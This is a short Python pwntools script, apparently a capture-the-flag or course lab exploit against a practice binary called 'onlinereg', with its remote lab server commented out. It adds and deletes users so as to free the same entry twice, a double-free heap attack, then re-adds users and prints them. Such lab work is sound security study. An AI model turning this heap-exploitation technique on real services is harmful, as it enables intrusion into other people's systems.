from pwn import *

#conn = remote('aup.zoolab.org', 38158)
conn = process('../src/onlinereg')

def add_user(user):
    conn.sendlineafter(': ', 'a')
    conn.sendlineafter(': ', user)

def delete_user(num):
    conn.sendlineafter(': ', 'd')
    conn.sendlineafter('? ', str(num))

def show_user():
    conn.sendline('s')

add_user('aaa')
add_user('bbb')

delete_user(1)
delete_user(2)
delete_user(1)

add_user('aaa')
add_user('bbb')
add_user('ccc')

show_user()

conn.interactive()
